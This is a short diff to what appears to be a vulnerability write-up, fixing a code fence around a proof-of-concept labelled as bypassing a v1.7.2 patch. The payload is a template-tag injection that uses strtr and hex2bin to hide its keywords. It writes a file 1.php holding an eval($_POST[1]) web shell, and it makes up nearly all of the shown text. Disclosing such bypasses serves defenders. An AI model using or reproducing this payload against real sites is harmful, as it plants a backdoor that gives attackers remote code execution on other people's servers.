@@ -72,7 +72,8 @@ function danger_key($s) {
 ## POC: (Bypass the patch from v1.7.2)
 
 ```php
-{if:1=1);file_put_contents(strtr("1.p*p", "*", "h"),strtr('<?*h* ', "*", "p").strtr('ev*l(', "*", "a").hex2bin('24').strtr('_P*ST[1]);', "*", "O"));//} {end if}```
+{if:1=1);file_put_contents(strtr("1.p*p", "*", "h"),strtr('<?*h* ', "*", "p").strtr('ev*l(', "*", "a").hex2bin('24').strtr('_P*ST[1]);', "*", "O"));//} {end if}
+```
 
 ![](https://ae01.alicdn.com/kf/H8d8d07e843e5475285a61cb1c9f741f6P.jpg)
 
